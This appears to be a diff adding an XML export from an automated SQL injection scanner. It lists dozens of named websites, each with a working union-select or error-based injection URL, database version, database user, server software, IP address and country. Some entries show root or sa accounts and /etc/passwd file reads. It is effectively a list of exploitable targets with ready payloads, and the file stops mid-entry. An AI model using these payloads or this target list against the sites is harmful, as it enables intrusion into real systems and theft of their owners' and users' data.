@@ -1,0 +1,886 @@
+<?xml version="1.0" standalone="yes"?>
+<DocumentElement>
+  <Item>
+    <C01>http://www.pro-section.com/boutique06/achat/index.php?id=999999.9 union all select 1,[t]--</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>4.0.18</C04>
+    <C05>pro-section@wheat.imingo.net</C05>
+    <C06>N/A [P:2,867,602 R:3,162,292 D:941,400] (N/A)</C06>
+    <C07>Apache/2.0.59 (Unix) m4vh/1.2.0 PHP/5.1.4</C07>
+    <C08>[FR] France</C08>
+    <C09>81.28.98.73</C09>
+    <C10>08/30 00:17</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://bewine.be/news.php?id=999999.9 union all select [t],2,3,4,5,6--</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.0.32-Debian_7etch12-log</C04>
+    <C05>bewine2@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[BE] Belgium</C08>
+    <C09>194.1.205.11</C09>
+    <C10>08/30 00:17</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.askottawa.info/user.php?uid=999999.9 union all select 1,2,3,4,[t],6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.44-cll-lve</C04>
+    <C05>askottawa@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[--] N/A</C08>
+    <C09>23.229.145.98</C09>
+    <C10>08/30 00:21</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.adasisrael.ca/city.php?id=17 or 1=999999.9 union all select 1,2,3,4,5,[t],7,8</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.7.26-log</C04>
+    <C05>adasisrael167553@209.235.136.146</C05>
+    <C06>N/A [P:2,111,904 R:3,000,384 D:-2,386,476] (N/A)</C06>
+    <C08>[CA] Canada</C08>
+    <C09>216.251.43.17</C09>
+    <C10>08/30 06:47</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.asfaa.org/members.php?id=999999.9 union all select 1,[t],3,4</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.36-82.0</C04>
+    <C05>db83231@70.32.68.19</C05>
+    <C06>120,859:IN [P:569,767 R:669,240 D:-45,935] (N/A)</C06>
+    <C07>Apache/2.2.34</C07>
+    <C08>[US] United States</C08>
+    <C09>70.32.68.120</C09>
+    <C10>08/30 06:47</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://miruslug.info/index.php?last_razd=198&amp;city=999999.9 union all select [t]&amp;razd=198&amp;rubr=&amp;podrubr=</C01>
+    <C02>MySQL Union</C02>
+    <C03>Load:/etc/passwd </C03>
+    <C04>5.5.63-MariaDB-1ubuntu0.14.04.1</C04>
+    <C05>5.5.63-MariaDB-1ubuntu0.14.04.1</C05>
+    <C06>N/A [P:5,977,749 R:6,556,398 D:2,490,721] (N/A)</C06>
+    <C07>cloudflare</C07>
+    <C08>[--] N/A</C08>
+    <C09>104.27.183.68</C09>
+    <C10>08/30 06:47</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.katoombagroup.org/details.php?id=999999.9' union all select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,[t],23,24,25,26 and '0'='0</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>4.1.22</C04>
+    <C05>katoomba_editor@localhost</C05>
+    <C06>N/A [P:943,067 R:1,027,309 D:287,645] (N/A)</C06>
+    <C07>Apache/2.0.64 (Unix)</C07>
+    <C08>[US] United States</C08>
+    <C09>98.159.35.10</C09>
+    <C10>08/30 06:47</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://dressupspark.com/games.php?id=999999.9' union all select 1,2,3,4,5,6,7,8,9,10,[t],12,13,14 and '0'='0</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>10.1.41-MariaDB</C04>
+    <C05>zbrozlo_spark@10.254.34.148</C05>
+    <C06>N/A [P:1,155,023 R:1,175,250 D:-1,989,680] (N/A)</C06>
+    <C07>Apache/2</C07>
+    <C08>[PL] Poland</C08>
+    <C09>85.128.234.71</C09>
+    <C10>08/30 06:47</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://homesteadcrossinginc.com/show-property.php?PropertyID=999999.9' union all select 1,2,3,4,[t],6,7,8,9,10,11,12,13 and '0'='0&amp;LandForSale=Older-homestead-with-cabin-well-cistern-shop-and-more</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.41</C04>
+    <C05>homestea_admin@localhost</C05>
+    <C06>N/A [P:6,790,183 R:6,530,845 D:2,297,266] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[US] United States</C08>
+    <C09>108.160.159.147</C09>
+    <C10>08/30 06:47</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.ums-riate.fr/lexique/modeleterme.php?id=999999.9 union all select [t]--</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.0.86</C04>
+    <C05>late@localhost</C05>
+    <C06>N/A [P:1,354,881 R:1,098,948 D:-3,263,613] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[FR] France</C08>
+    <C09>80.247.224.180</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://edmazur.com/game/item.php?id=15' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.41-84.1-log</C04>
+    <C05>edmazurdb@10.1.112.53</C05>
+    <C06>N/A [P:4,313,873 R:4,173,155 D:-258,937] (N/A)</C06>
+    <C07>Apache/2</C07>
+    <C08>[US] United States</C08>
+    <C09>65.254.227.224</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.sportsfanaticphotography.com/show_cart.php?id=81999999.9' union all select [t],2,3,4,5,6,7,8,9,10,11 and '0'='0</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.0.95-log</C04>
+    <C05>c11977_sportsr1@10.10.61.3</C05>
+    <C06>N/A [P:4,231,239 R:4,754,034 D:1,897,016] (N/A)</C06>
+    <C07>Apache/2.4.35 (FreeBSD)</C07>
+    <C08>[US] United States</C08>
+    <C09>207.251.48.37</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.radomes.org/museum/guestbook.php?year=999999.9 union all select [t]&amp;month=6</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.5.19</C04>
+    <C05>afrma@localhost</C05>
+    <C06>N/A [P:3,762,539 R:4,160,264 D:-462,487] (N/A)</C06>
+    <C07>Apache/2.2.22 (FreeBSD) PHP/5.3.10 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8q DAV/2</C07>
+    <C08>[US] United States</C08>
+    <C09>65.111.241.218</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://motocollants.free.fr/store/achat/index.php?id=999999.9 union all select 1,[t]</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.0.83</C04>
+    <C05>motocollants@172.20.245.57</C05>
+    <C06>N/A [P:7,281,204 R:7,639,473 D:-9,647,349] (N/A)</C06>
+    <C07>Apache/ProXad [Jul 22 2015 14:50:04]</C07>
+    <C08>[FR] France</C08>
+    <C09>212.27.63.116</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.sincodiv-rj.com.br/noticias.php?id=43' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.5.48</C04>
+    <C05>CD_10_SINCODIV@10.10.10.69</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[BR] Brazil</C08>
+    <C09>177.70.106.69</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.vosges-saonoises.eu/annuaire-mail.php?NumPage=325999999.9' union all select [t],2,3,4,5,6 and '0'='0</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.7.24</C04>
+    <C05>vosgesao@10.244.14.243</C05>
+    <C06>N/A [P:8,460,386 R:7,755,805 D:1,884,834] (N/A)</C06>
+    <C07>nginx/1.13.12</C07>
+    <C08>[EU] Europe</C08>
+    <C09>87.98.159.185</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.calvadosienne.fr/index.php?m=122 or 1=[t] and 1=1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.0.51a-24+lenny5-log</C04>
+    <C05>calvados@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g mod_perl/2.0.4 Perl/v5.10.0</C07>
+    <C08>[FR] France</C08>
+    <C09>91.191.144.133</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://webscantest.com/datastore/search_get_by_id.php?id=999999.9 union all select [t],2,3,4</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.5.62-0ubuntu0.14.04.1</C04>
+    <C05>webscantest@localhost</C05>
+    <C06>N/A [P:1,354,451 R:1,500,937 D:425,154] (N/A)</C06>
+    <C07>Apache/2.4.7 (Ubuntu)</C07>
+    <C08>[US] United States</C08>
+    <C09>69.164.223.208</C09>
+    <C10>08/30 06:48</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.mabcosweaters.com.ar/login.php?cat=i17' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.41-cll-lve</C04>
+    <C05>mabco_user@localhost</C05>
+    <C06>N/A [P:12,139,108 R:13,009,596 D:6,061,366] (N/A)</C06>
+    <C07>nginx</C07>
+    <C08>[AR] Argentina</C08>
+    <C09>190.210.176.92</C09>
+    <C10>08/30 06:49</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://doprava.nktcables.cz/login.php?lang=fr' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.5.62-0+deb8u1</C04>
+    <C05>nkt_doprava@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache/2.4.10 (Debian)</C07>
+    <C08>[CZ] Czech Republic</C08>
+    <C09>91.146.121.64</C09>
+    <C10>08/30 06:49</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://theapeprophet.com/article1.php?id=999999.9 union all select [t],2</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>4.1.14</C04>
+    <C05>johnk@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>ATS/7.1.2</C07>
+    <C08>[US] United States</C08>
+    <C09>98.137.244.36</C09>
+    <C10>08/30 06:49</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://www.mjdtools.com/AuctionList.php?axcode=999999.9' union all select [t],2,3,4,5,6,7 and '0'='0&amp;page=16&amp;limit=</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.33</C04>
+    <C05>mjdtools_website@108.175.169.137</C05>
+    <C06>N/A [P:5,063,392 R:5,176,715 D:-655,147] (N/A)</C06>
+    <C07>Apache/2.4.9 (Unix) OpenSSL/1.0.1e-fips mod_bwlimited/1.4</C07>
+    <C08>[US] United States</C08>
+    <C09>108.175.169.137</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.pipeline-team.com/register.php?lang=en or 1=[t] and 1=1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.40-84.0-log</C04>
+    <C05>nicolado_pippu@localhost</C05>
+    <C06>N/A [P:1,956,030 R:1,982,246 D:1,042,953] (N/A)</C06>
+    <C07>nginx</C07>
+    <C08>[RO] Romania</C08>
+    <C09>37.60.245.227</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://members.serverplace.net/signup/signup.php?id=39' or 1=[t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.45</C04>
+    <C05>place_lp@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[NL] Netherlands</C08>
+    <C09>85.17.15.207</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://www.losbobau-fenstershop.com/index.php?com=konfigurator&amp;alias=999999.9' union all select 1,2,3,4,[t],6,7,8 and '0'='0&amp;step=1</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.36</C04>
+    <C05>losbobau_los@localhost</C05>
+    <C06>N/A [P:3,453,064 R:2,969,780 D:-431,602] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[PL] Poland</C08>
+    <C09>62.75.153.98</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.meggieschneider.com/php/detail.php?id=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.42-log</C04>
+    <C05>U383432@klute.store.d0m.de</C05>
+    <C06>N/A [P:3,073,965 R:3,494,489 D:913,794] (N/A)</C06>
+    <C07>Apache/2.4.39 (Unix)</C07>
+    <C08>[DE] Germany</C08>
+    <C09>81.169.145.158</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://www.histoires-de-sexe.net/sexe/tag.php?tag=Vieux%20avec%20jeunes' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.1.73</C04>
+    <C05>hds@localhost</C05>
+    <C06>N/A [P:189,284 R:194,376 D:40,234] (N/A)</C06>
+    <C07>nginx</C07>
+    <C08>[FR] France</C08>
+    <C09>84.246.226.243</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.gysilver.com/board/bbsView.asp?bbscode=17&amp;page=&amp;idx=[t]&amp;search=&amp;searchstr=</C01>
+    <C02>MS SQL Error</C02>
+    <C03 />
+    <C04>MS SQL 2008 R2 (</C04>
+    <C05>gysilver</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Microsoft-IIS/7.5</C07>
+    <C08>[KR] Korea, Republic of</C08>
+    <C09>110.45.140.124</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://www.cst-vb.it/GUIC3/login.php?ID=[t]</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.5.52-cll-lve</C04>
+    <C05>dbuser@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>nginx</C07>
+    <C08>[IT] Italy</C08>
+    <C09>176.227.172.216</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.ngo-forum.de/ngos.php?sektion=show_dngo&amp;id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.42-log</C04>
+    <C05>www.nepal-euro.de@tres.store.d0m.de</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache/2.4.39 (Unix)</C07>
+    <C08>[DE] Germany</C08>
+    <C09>81.169.145.165</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.sasamo.co.kr/cafe/dcclass_view.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14</C01>
+    <C02>MySQL Union</C02>
+    <C03>Load:/etc/passwd </C03>
+    <C04>4.0.18</C04>
+    <C05>photo2@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[KR] Korea, Republic of</C08>
+    <C09>211.115.216.43</C09>
+    <C10>08/30 06:50</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.mktactical.com/workshop/register.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.0.96-log</C04>
+    <C05>mktacticalAdmin1@173.201.196.218</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[US] United States</C08>
+    <C09>173.201.208.93</C09>
+    <C10>08/30 06:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://peoplequiz.com/index.php?framecontent=register.php' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.35-log</C04>
+    <C05>pqadmin@172.31.52.188</C05>
+    <C06>N/A [P:1,640,406 R:1,552,611 D:-185,576] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[US] United States</C08>
+    <C09>34.193.93.182</C09>
+    <C10>08/30 06:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.inomuski.com/bbs/index.php?id=grallery&amp;prc=read&amp;idx=999999.9 union all select 1,2,3,4,5,6,7,8,9,10,11,[t],13,14,15,16,17,18,19,20,21,22</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>4.0.27</C04>
+    <C05>inomuski@loca</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Microsoft-IIS/5.0</C07>
+    <C08>[KR] Korea, Republic of</C08>
+    <C09>121.78.91.31</C09>
+    <C10>08/30 06:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://www.domainnameshop.co.uk/login.php?f_act=loggedout&amp;aff=[t]</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.42</C04>
+    <C05>melissa@localhost</C05>
+    <C06>N/A [P:1,037,360 R:1,324,430 D:-3,023,355] (N/A)</C06>
+    <C07>Apache/2.4.6 (CentOS)</C07>
+    <C08>[GB] United Kingdom</C08>
+    <C09>78.157.217.22</C09>
+    <C10>08/30 06:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://wiig.de/user.php?Username=henni4u&amp;Show=Meine-Spiele&amp;Position=200&amp;Sort=[t]</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.19-67.0-log</C04>
+    <C05>db72839_10@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache/2.4.39</C07>
+    <C08>[DE] Germany</C08>
+    <C09>80.67.28.237</C09>
+    <C10>08/30 06:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.sweetyshop.de/sweets/sortiment.php?topid=3&amp;men=DEKOMENU&amp;wgno=NF' and [t] and '1'='1&amp;hgno=NFTD&amp;sgno=NFTDHO&amp;nStPg=1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.42-log</C04>
+    <C05>U1274905@mor.store.d0m.de</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache/2.4.39 (Unix)</C07>
+    <C08>[DE] Germany</C08>
+    <C09>81.169.145.160</C09>
+    <C10>08/30 06:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://erotik.111x.de/user.php?site=ero-news' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.5.62</C04>
+    <C05>nylondbb@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>nginx</C07>
+    <C08>[DE] Germany</C08>
+    <C09>212.83.36.181</C09>
+    <C10>08/30 06:51</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://kaidai.shop/user.php?uid=[t]</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.5.28</C04>
+    <C05>divdesignc_get1@localhost</C05>
+    <C06>N/A [P:10,479,722 R:10,753,428 D:4,112,911] (N/A)</C06>
+    <C07>nginx/0.9.4</C07>
+    <C08>[TH] Thailand</C08>
+    <C09>27.254.153.10</C09>
+    <C10>08/30 06:52</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.czga.ro/pagina.php?id=10999999.9' union all select 1,2,[t],4,5,6,7 and '0'='0</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.5.62-0ubuntu0.14.04.1</C04>
+    <C05>czga@localhost</C05>
+    <C06>N/A [P:2,926,899 R:3,283,688 D:-1,632,445] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[RO] Romania</C08>
+    <C09>86.120.110.18</C09>
+    <C10>08/30 06:52</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.mappery.com/user.php?name=ctxguide.com' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.1.73-0ubuntu0.10.04.1</C04>
+    <C05>root@localhost</C05>
+    <C06>98,987:US [P:162,527 R:151,793 D:10,397] (N/A)</C06>
+    <C07>Apache/2.2.14 (Ubuntu)</C07>
+    <C08>[US] United States</C08>
+    <C09>173.255.244.72</C09>
+    <C10>08/30 06:52</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.dust-mites.org/news.php?story=4999999.9' union all select [t],2,3,4,5 and '0'='0</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.5.49-0ubuntu0.12.04.1</C04>
+    <C05>dustmite_main@localhost</C05>
+    <C06>N/A [P:9,024,437 R:9,492,975 D:N/A] (N/A)</C06>
+    <C07>FreeOSHTTP</C07>
+    <C08>[US] United States</C08>
+    <C09>72.52.227.205</C09>
+    <C10>08/30 06:52</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://loja.neilar.com.br/login.php?tipo=5999999.9' union all select 1,2,3,[t],5,6,7,8,9,10,11,12 and '0'='0</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.45</C04>
+    <C05>neilarc_loja@localhost</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[BR] Brazil</C08>
+    <C09>45.79.161.146</C09>
+    <C10>08/30 06:52</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.wodeban.com/teacher/dirary_read.jsp?id=80' or 1=[t] and '1'='1&amp;tid=gaoyan0</C01>
+    <C02>MS SQL Error</C02>
+    <C03 />
+    <C04>MS SQL  2000 - 8</C04>
+    <C05>sa</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>WebLogic Server 8.1 SP3 Wed Jul 21 01:52:36 PDT 2004 411822</C07>
+    <C08>[CN] China</C08>
+    <C09>119.188.169.218</C09>
+    <C10>08/30 06:53</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.fisciano.com/old_client/?section=MAIN_NEWS&amp;subsection=moving&amp;id=999999.9 union all select 1,[t],3,4,5,6,7,8,9,10,11,12,13</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.0.92-50-log</C04>
+    <C05>Sql155565@62.149.141.50</C05>
+    <C06>N/A [P:N/A R:N/A D:N/A] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[IT] Italy</C08>
+    <C09>62.149.140.48</C09>
+    <C10>08/30 06:53</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://stellatech.com/register.php?lang=en' and [t] and '1'='1</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.5.62</C04>
+    <C05>avaDhesh2d7@localhost</C05>
+    <C06>N/A [P:380,000 R:331,328 D:89,681] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[UA] Ukraine</C08>
+    <C09>94.130.52.40</C09>
+    <C10>08/30 06:53</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.coda.cc/product/product.php?id=999999.9 union all select 1,2,[t],4,5,6,7,8,9,10,11,12,13</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.6.44-cll-lve</C04>
+    <C05>codatech_user@localhost</C05>
+    <C06>N/A [P:2,007,257 R:1,978,581 D:844,770] (N/A)</C06>
+    <C07>Apache</C07>
+    <C08>[CC] Cocos (Keeling) Islands</C08>
+    <C09>107.180.47.9</C09>
+    <C10>08/30 06:53</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>https://www.fetishupdates.com/click_in.php?id=[t]</C01>
+    <C02>MySQL Error</C02>
+    <C03 />
+    <C04>5.6.43</C04>
+    <C05>root@localhost</C05>
+    <C06>N/A [P:8,698,733 R:7,981,552 D:4,216,880] (N/A)</C06>
+    <C07>Apache/2.4.25 (Debian)</C07>
+    <C08>[--] N/A</C08>
+    <C09>185.57.90.18</C09>
+    <C10>08/30 06:55</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
+    <C01>http://www.kookboekenshop.nl/user.php?user=1 or 1=999999.9 union all select [t],2,3,4,5,6,7,8,9,10,11</C01>
+    <C02>MySQL Union</C02>
+    <C03 />
+    <C04>5.7.23</C04>
+    <C05>deb6514n2_gerben@localhost</C05>
+    <C06>N/A [P:13,489,054 R:13,020,206 D:7,771,267] (N/A)</C06>
+    <C07>Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.5.35 mod_python/3.5.0- Python/2.7.5</C07>
+    <C08>[NL] Netherlands</C08>
+    <C09>46.235.40.64</C09>
+    <C10>08/30 06:55</C10>
+    <C11 />
+    <C12 />
+    <C13 />
+    <C14 />
+    <C15 />
+  </Item>
+  <Item>
